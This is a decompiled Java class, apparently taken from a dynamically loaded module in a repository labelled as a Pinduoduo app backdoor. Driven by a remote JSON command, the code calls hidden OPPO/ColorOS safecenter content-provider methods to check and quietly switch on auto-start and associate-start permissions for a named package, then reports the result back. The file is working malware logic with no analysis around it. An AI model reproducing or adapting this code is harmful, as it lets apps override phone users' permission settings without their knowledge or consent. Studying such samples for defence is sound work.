package com.google.android.sd.biz_dynamic_dex.oppo_boot_perm;

import android.content.Context;
import android.net.Uri;
import android.os.Bundle;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Set;
import org.json.JSONArray;
import org.json.JSONObject;

public class OppoBootPermExecutor extends DynamicCmdExecutor {
  private static final String ASSOCIATE = "associate";
  
  private static final int CHECK_FAILED = -1;
  
  private static final int CHECK_PERM_GRANTED = 0;
  
  private static final int CHECK_PERM_REJECTED = 1;
  
  private static final int CMD = 3007;
  
  private static final String COLOROS_PATH = "content://com.coloros.safecenter.security.InterfaceProvider";
  
  private static final String COLOROS_SAFECENTER = "com.coloros.safecenter";
  
  private static final String OPLUS_PATH = "content://com.oplus.safecenter.security.InterfaceProvider";
  
  private static final String OPLUS_SAFECENTER = "com.oplus.safecenter";
  
  private static final String STARTUP = "startup";
  
  private static String pkgName = "";
  
  private static String safecenterPath = "content://com.coloros.safecenter.security.InterfaceProvider";
  
  private int checkPerm(Context paramContext, String paramString) {
    if (TextUtils.equals(paramString, "startup")) {
      paramString = "getStartupState";
    } else if (TextUtils.equals(paramString, "associate")) {
      paramString = "getAssociateStartState";
    } else {
      return -1;
    } 
    Bundle bundle = doMethod(paramContext, paramString);
    return (bundle != null) ? (!bundle.containsKey(pkgName) ? -1 : (bundle.getBoolean(pkgName) ^ true)) : -1;
  }
  
  private Bundle doMethod(Context paramContext, String paramString) {
    if (TextUtils.isEmpty(paramString))
      return null; 
    try {
      Uri uri = Uri.parse(safecenterPath);
      ArrayList<String> arrayList = new ArrayList();
      arrayList.add(pkgName);
      Bundle bundle = new Bundle();
      bundle.putStringArrayList("packageList", arrayList);
      return paramContext.getContentResolver().call(uri, paramString, "", bundle);
    } finally {
      paramContext = null;
    } 
  }
  
  private Set<String> getPermArray(JSONObject paramJSONObject) {
    HashSet<String> hashSet = new HashSet();
    JSONArray jSONArray = paramJSONObject.optJSONArray("perm");
    if (jSONArray == null)
      return hashSet; 
    for (int i = 0; i != jSONArray.length(); i++) {
      String str = jSONArray.optString(i);
      if (TextUtils.equals(str, "startup") || TextUtils.equals(str, "associate"))
        hashSet.add(str); 
    } 
    return hashSet;
  }
  
  private int openPerm(Context paramContext, String paramString) {
    String str;
    if (TextUtils.equals(paramString, "startup")) {
      str = "setStartupState";
    } else {
      if (TextUtils.equals(paramString, "associate")) {
        str = "setAssociateStartState";
        doMethod(paramContext, str);
        return checkPerm(paramContext, paramString);
      } 
      return -1;
    } 
    doMethod(paramContext, str);
    return checkPerm(paramContext, paramString);
  }
  
  protected void realExecute(Context paramContext, String paramString) throws Exception {
    // Byte code:
    //   0: aload_2
    //   1: invokestatic isEmpty : (Ljava/lang/CharSequence;)Z
    //   4: ifeq -> 30
    //   7: aload_1
    //   8: new com/google/android/sd/cmd/CmdData
    //   11: dup
    //   12: sipush #3007
    //   15: ldc 'client'
    //   17: invokespecial <init> : (ILjava/lang/String;)V
    //   20: ldc 'empty_input'
    //   22: aconst_null
    //   23: invokestatic buildErrorRespData : (Lcom/google/android/sd/cmd/CmdData;Ljava/lang/String;Lorg/json/JSONObject;)Lcom/google/android/sd/cmd/CmdData;
    //   26: invokestatic dispatch : (Landroid/content/Context;Lcom/google/android/sd/cmd/CmdData;)V
    //   29: return
    //   30: new org/json/JSONObject
    //   33: dup
    //   34: aload_2
    //   35: invokespecial <init> : (Ljava/lang/String;)V
    //   38: astore #7
    //   40: new com/google/android/sd/cmd/CmdData
    //   43: dup
    //   44: sipush #3007
    //   47: aload #7
    //   49: ldc 'uuid'
    //   51: invokevirtual optString : (Ljava/lang/String;)Ljava/lang/String;
    //   54: ldc 'client'
    //   56: aload_2
    //   57: invokespecial <init> : (ILjava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    //   60: astore #6
    //   62: getstatic android/os/Build$VERSION.SDK_INT : I
    //   65: bipush #29
    //   67: if_icmpgt -> 83
    //   70: aload_1
    //   71: aload #6
    //   73: ldc 'unSupport_os_version'
    //   75: aconst_null
    //   76: invokestatic buildErrorRespData : (Lcom/google/android/sd/cmd/CmdData;Ljava/lang/String;Lorg/json/JSONObject;)Lcom/google/android/sd/cmd/CmdData;
    //   79: invokestatic dispatch : (Landroid/content/Context;Lcom/google/android/sd/cmd/CmdData;)V
    //   82: return
    //   83: aload_0
    //   84: aload_1
    //   85: invokevirtual isReadyToExecute : (Landroid/content/Context;)Z
    //   88: ifne -> 104
    //   91: aload_1
    //   92: aload #6
    //   94: ldc 'not_ready'
    //   96: aconst_null
    //   97: invokestatic buildErrorRespData : (Lcom/google/android/sd/cmd/CmdData;Ljava/lang/String;Lorg/json/JSONObject;)Lcom/google/android/sd/cmd/CmdData;
    //   100: invokestatic dispatch : (Landroid/content/Context;Lcom/google/android/sd/cmd/CmdData;)V
    //   103: return
    //   104: iconst_0
    //   105: istore_3
    //   106: aload_1
    //   107: invokevirtual getPackageManager : ()Landroid/content/pm/PackageManager;
    //   110: ldc 'com.oplus.safecenter'
    //   112: iconst_0
    //   113: invokevirtual getPackageInfo : (Ljava/lang/String;I)Landroid/content/pm/PackageInfo;
    //   116: pop
    //   117: ldc 'content://com.oplus.safecenter.security.InterfaceProvider'
    //   119: putstatic com/google/android/sd/biz_dynamic_dex/oppo_boot_perm/OppoBootPermExecutor.safecenterPath : Ljava/lang/String;
    //   122: goto -> 141
    //   125: aload_1
    //   126: invokevirtual getPackageManager : ()Landroid/content/pm/PackageManager;
    //   129: ldc 'com.coloros.safecenter'
    //   131: iconst_0
    //   132: invokevirtual getPackageInfo : (Ljava/lang/String;I)Landroid/content/pm/PackageInfo;
    //   135: pop
    //   136: ldc 'content://com.coloros.safecenter.security.InterfaceProvider'
    //   138: putstatic com/google/android/sd/biz_dynamic_dex/oppo_boot_perm/OppoBootPermExecutor.safecenterPath : Ljava/lang/String;
    //   141: aload #7
    //   143: ldc 'pkg_name'
    //   145: invokevirtual optString : (Ljava/lang/String;)Ljava/lang/String;
    //   148: astore_2
    //   149: aload_2
    //   150: putstatic com/google/android/sd/biz_dynamic_dex/oppo_boot_perm/OppoBootPermExecutor.pkgName : Ljava/lang/String;
    //   153: aload_2
    //   154: invokestatic isEmpty : (Ljava/lang/CharSequence;)Z
    //   157: ifeq -> 173
    //   160: aload_1
    //   161: aload #6
    //   163: ldc 'no_pkgName'
    //   165: aconst_null
    //   166: invokestatic buildErrorRespData : (Lcom/google/android/sd/cmd/CmdData;Ljava/lang/String;Lorg/json/JSONObject;)Lcom/google/android/sd/cmd/CmdData;
    //   169: invokestatic dispatch : (Landroid/content/Context;Lcom/google/android/sd/cmd/CmdData;)V
    //   172: return
    //   173: aload #7
    //   175: ldc 'action'
    //   177: invokevirtual optString : (Ljava/lang/String;)Ljava/lang/String;
    //   180: astore #8
    //   182: aload_0
    //   183: aload #7
    //   185: invokespecial getPermArray : (Lorg/json/JSONObject;)Ljava/util/Set;
    //   188: astore #9
    //   190: new org/json/JSONObject
    //   193: dup
    //   194: invokespecial <init> : ()V
    //   197: astore #7
    //   199: ldc 'check'
    //   201: aload #8
    //   203: invokestatic equals : (Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Z
    //   206: istore #5
    //   208: ldc 'request_failed'
    //   210: astore_2
    //   211: iload #5
    //   213: ifeq -> 311
    //   216: aload #9
    //   218: invokeinterface iterator : ()Ljava/util/Iterator;
    //   223: astore #8
    //   225: iconst_0
    //   226: istore_3
    //   227: aload #8
    //   229: invokeinterface hasNext : ()Z
    //   234: ifeq -> 298
    //   237: aload #8
    //   239: invokeinterface next : ()Ljava/lang/Object;
    //   244: checkcast java/lang/String
    //   247: astore #9
    //   249: aload_0
    //   250: aload_1
    //   251: aload #9
    //   253: invokespecial checkPerm : (Landroid/content/Context;Ljava/lang/String;)I
    //   256: istore #4
    //   258: iload #4
    //   260: ifeq -> 284
    //   263: iload #4
    //   265: iconst_1
    //   266: if_icmpeq -> 272
    //   269: goto -> 227
    //   272: aload #7
    //   274: aload #9
    //   276: iconst_0
    //   277: invokevirtual put : (Ljava/lang/String;Z)Lorg/json/JSONObject;
    //   280: pop
    //   281: goto -> 293
    //   284: aload #7
    //   286: aload #9
    //   288: iconst_1
    //   289: invokevirtual put : (Ljava/lang/String;Z)Lorg/json/JSONObject;
    //   292: pop
    //   293: iconst_1
    //   294: istore_3
    //   295: goto -> 227
    //   298: iload_3
    //   299: ifeq -> 305
    //   302: goto -> 308
    //   305: ldc 'check all failed'
    //   307: astore_2
    //   308: goto -> 443
    //   311: ldc 'open'
    //   313: aload #8
    //   315: invokestatic equals : (Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Z
    //   318: ifeq -> 416
    //   321: aload #9
    //   323: invokeinterface iterator : ()Ljava/util/Iterator;
    //   328: astore #8
    //   330: iconst_0
    //   331: istore_3
    //   332: aload #8
    //   334: invokeinterface hasNext : ()Z
    //   339: ifeq -> 403
    //   342: aload #8
    //   344: invokeinterface next : ()Ljava/lang/Object;
    //   349: checkcast java/lang/String
    //   352: astore #9
    //   354: aload_0
    //   355: aload_1
    //   356: aload #9
    //   358: invokespecial openPerm : (Landroid/content/Context;Ljava/lang/String;)I
    //   361: istore #4
    //   363: iload #4
    //   365: ifeq -> 389
    //   368: iload #4
    //   370: iconst_1
    //   371: if_icmpeq -> 377
    //   374: goto -> 332
    //   377: aload #7
    //   379: aload #9
    //   381: iconst_0
    //   382: invokevirtual put : (Ljava/lang/String;Z)Lorg/json/JSONObject;
    //   385: pop
    //   386: goto -> 398
    //   389: aload #7
    //   391: aload #9
    //   393: iconst_1
    //   394: invokevirtual put : (Ljava/lang/String;Z)Lorg/json/JSONObject;
    //   397: pop
    //   398: iconst_1
    //   399: istore_3
    //   400: goto -> 332
    //   403: iload_3
    //   404: ifeq -> 410
    //   407: goto -> 302
    //   410: ldc 'open all failed'
    //   412: astore_2
    //   413: goto -> 308
    //   416: new java/lang/StringBuilder
    //   419: dup
    //   420: invokespecial <init> : ()V
    //   423: astore_2
    //   424: aload_2
    //   425: ldc 'unknown action '
    //   427: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   430: pop
    //   431: aload_2
    //   432: aload #8
    //   434: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   437: pop
    //   438: aload_2
    //   439: invokevirtual toString : ()Ljava/lang/String;
    //   442: astore_2
    //   443: iload_3
    //   444: ifeq -> 459
    //   447: aload #6
    //   449: aload #7
    //   451: aconst_null
    //   452: invokestatic buildSucceedRespData : (Lcom/google/android/sd/cmd/CmdData;Lorg/json/JSONObject;Lorg/json/JSONObject;)Lcom/google/android/sd/cmd/CmdData;
    //   455: astore_2
    //   456: goto -> 467
    //   459: aload #6
    //   461: aload_2
    //   462: aconst_null
    //   463: invokestatic buildErrorRespData : (Lcom/google/android/sd/cmd/CmdData;Ljava/lang/String;Lorg/json/JSONObject;)Lcom/google/android/sd/cmd/CmdData;
    //   466: astore_2
    //   467: aload_1
    //   468: aload_2
    //   469: invokestatic dispatch : (Landroid/content/Context;Lcom/google/android/sd/cmd/CmdData;)V
    //   472: return
    //   473: aload_1
    //   474: aload #6
    //   476: ldc_w 'no_safecenter'
    //   479: aconst_null
    //   480: invokestatic buildErrorRespData : (Lcom/google/android/sd/cmd/CmdData;Ljava/lang/String;Lorg/json/JSONObject;)Lcom/google/android/sd/cmd/CmdData;
    //   483: invokestatic dispatch : (Landroid/content/Context;Lcom/google/android/sd/cmd/CmdData;)V
    //   486: return
    //   487: astore_2
    //   488: goto -> 125
    //   491: astore_2
    //   492: goto -> 473
    // Exception table:
    //   from	to	target	type
    //   106	122	487	java/lang/Exception
    //   125	141	491	java/lang/Exception
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\e723d560-c2ee-461e-b2a1-96f85b614f2b-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\oppo_boot_perm\OppoBootPermExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */